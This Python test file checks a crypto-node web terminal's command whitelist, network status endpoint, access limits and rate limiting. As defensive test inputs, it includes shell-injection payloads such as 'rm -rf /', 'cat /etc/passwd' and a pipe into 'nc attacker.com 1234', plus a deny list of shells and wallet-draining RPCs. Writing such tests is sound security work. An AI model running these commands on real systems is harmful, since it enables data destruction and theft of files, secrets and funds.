"""Tests for DogeFeedX terminal command whitelist and network API.

These test the safe, public terminal command API and network status endpoint
added for the DogeFeedX theme. The terminal command whitelist ensures users
cannot run arbitrary shell commands or access admin-only RPC methods.
"""

import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from test_web import app_state, client                          # noqa: F401,E402

from arcade.web import door                                      # noqa: E402


def test_terminal_commands_endpoint_lists_the_whitelist(client):
    """The /api/terminal/commands endpoint returns the list of allowed commands."""
    app, _state = client
    response = app.get("/api/terminal/commands")
    assert response.status_code == 200
    data = response.json()
    assert "commands" in data
    commands = data["commands"]
    for required in ("help", "status", "balance", "peers", "sync", "chains",
                     "block", "tx", "address", "inscription", "collection", "clear"):
        assert required in commands, f"'{required}' must be in the whitelist"
        assert isinstance(commands[required], str), f"'{required}' must have a description"


def test_terminal_exec_help_command(client):
    """The help command lists all available commands."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": "help"})
    assert response.status_code == 200
    data = response.json()
    assert "output" in data
    assert "Available commands" in data["output"]
    assert "help" in data["output"]
    assert "This terminal is read-only" in data["output"]


def test_terminal_exec_status_command(client):
    """The status command returns node version and state."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": "status"})
    assert response.status_code == 200
    data = response.json()
    assert "output" in data
    assert "Version" in data["output"] or "offline" in data["output"].lower()


def test_terminal_exec_chains_command(client):
    """The chains command shows configured chain info."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": "chains"})
    assert response.status_code == 200
    data = response.json()
    assert "output" in data
    assert "chains" in data["output"].lower()


def test_terminal_exec_peers_command(client):
    """The peers command shows connected peer count."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": "peers"})
    assert response.status_code == 200
    data = response.json()
    assert "output" in data


def test_terminal_exec_clear_command(client):
    """The clear command returns empty output."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": "clear"})
    assert response.status_code == 200
    data = response.json()
    assert data.get("output") == ""
    assert data.get("clear") is True


def test_terminal_exec_unknown_command_rejected(client):
    """Unknown commands are rejected with an error message."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": "rm -rf /"})
    assert response.status_code == 200
    data = response.json()
    assert "error" in data
    assert "unknown command" in data["error"].lower()
    assert "help" in data["output"]


def test_terminal_exec_empty_command(client):
    """Empty commands return a helpful message."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": ""})
    assert response.status_code == 200
    data = response.json()
    assert "error" in data
    assert "help" in data["output"]


def test_terminal_exec_no_command_given(client):
    """Missing command field returns a helpful message."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={})
    assert response.status_code == 200
    data = response.json()
    assert "error" in data


def test_terminal_block_command_without_hash(client):
    """The block command without a hash shows usage."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": "block"})
    assert response.status_code == 200
    data = response.json()
    assert "output" in data
    assert "Usage" in data["output"] or "block" in data["output"].lower()


def test_terminal_tx_command_without_txid(client):
    """The tx command without a txid shows usage."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": "tx"})
    assert response.status_code == 200
    data = response.json()
    assert "output" in data
    assert "Usage" in data["output"] or "tx" in data["output"].lower()


def test_terminal_address_command_without_address(client):
    """The address command without an address shows usage."""
    app, _state = client
    response = app.post("/api/terminal/exec", json={"command": "address"})
    assert response.status_code == 200
    data = response.json()
    assert "output" in data
    assert "Usage" in data["output"] or "address" in data["output"].lower()


def test_network_status_endpoint_returns_structure(client):
    """The /api/network endpoint returns expected fields."""
    app, _state = client
    response = app.get("/api/network")
    assert response.status_code == 200
    data = response.json()
    assert "chains" in data
    assert "mesh" in data
    assert "tunnel" in data
    assert "arcades" in data
    assert isinstance(data["chains"], list)
    assert isinstance(data["mesh"], dict)
    assert "connected" in data["mesh"]
    assert "peers" in data["mesh"]
    assert isinstance(data["tunnel"], dict)
    assert "active" in data["tunnel"]


def test_network_status_chains_have_required_fields(client):
    """Each chain in network status has required fields."""
    app, _state = client
    response = app.get("/api/network")
    data = response.json()
    for chain in data["chains"]:
        assert "network" in chain
        assert "label" in chain
        assert "coin" in chain
        assert "ready" in chain
        assert "progress" in chain
        assert "online" in chain
        assert isinstance(chain["progress"], (int, float))


def test_terminal_endpoints_are_public():
    """The terminal and network API endpoints must be public (no auth required)."""
    assert door.public_path("/api/terminal/commands")
    assert door.public_path("/api/terminal/exec", "POST")
    assert door.public_path("/api/network")


def test_terminal_command_whitelist_is_explicit(client):
    """The terminal command set is explicit and does not include dangerous commands.
    
    This is a defense-in-depth check. The TERMINAL_COMMANDS dict defines
    exactly what can run, and this test ensures certain dangerous commands
    or patterns can never be added without also changing this test.
    """
    dangerous = [
        "sh", "bash", "zsh", "exec", "eval", "system", "popen",
        "rm", "mv", "cp", "mkdir", "rmdir", "chmod", "chown",
        "kill", "reboot", "shutdown", "halt",
        "sendtoaddress", "sendfrom", "sendmany",
        "walletpassphrase", "encryptwallet", "dumpprivkey",
        "importprivkey", "signrawtransaction", "signmessage",
        "stop", "setban", "clearbanned",
        "sudo", "su", "passwd", "useradd", "userdel",
    ]
    app, _state = client
    response = app.get("/api/terminal/commands")
    commands = response.json()["commands"]
    for cmd in dangerous:
        assert cmd not in commands, f"'{cmd}' must not be in the terminal whitelist"


def test_terminal_does_not_execute_shell_metacharacters(client):
    """Commands with shell metacharacters are rejected, not interpreted."""
    app, _state = client
    for payload in [
        {"command": "help; rm -rf /"},
        {"command": "help && cat /etc/passwd"},
        {"command": "help | nc attacker.com 1234"},
        {"command": "$(whoami)"},
        {"command": "`id`"},
        {"command": "help > /tmp/pwned"},
    ]:
        response = app.post("/api/terminal/exec", json=payload)
        assert response.status_code == 200
        data = response.json()
        assert "error" in data, f"metacharacter payload {payload} should error"
        assert "unknown command" in data["error"].lower()


def test_the_terminal_and_the_network_window_are_for_the_arcades_own_people_and_limited(client):
    """Reviewed before merging (2026-11-03, PR #61): a stranger reaching the arcade's public address gets neither the
    terminal nor the Network window -- they read the node's Core and the mesh -- and the operator is limited per minute.
    The node's own error text never goes out, and only the operator sees the arcade's links."""
    from test_admin import EDGE, LOCAL
    app, _state = client
    assert app.post("/api/terminal/exec", json={"command": "status"}, headers=EDGE).status_code == 403
    assert app.get("/api/network", headers=EDGE).status_code == 403
    said = app.post("/api/terminal/exec", json={"command": "block", "args": "main 1"}, headers=LOCAL).json()
    assert "Error" not in said["output"] and "Traceback" not in said["output"]
    net = app.get("/api/network", headers=LOCAL).json()
    assert "node_id" not in net["mesh"] and "name" not in net["tunnel"] and net["arcades"] == []
    for _ in range(40):
        last = app.post("/api/terminal/exec", json={"command": "chains"}, headers=LOCAL)
    assert last.status_code == 429, "at most 30 a minute"
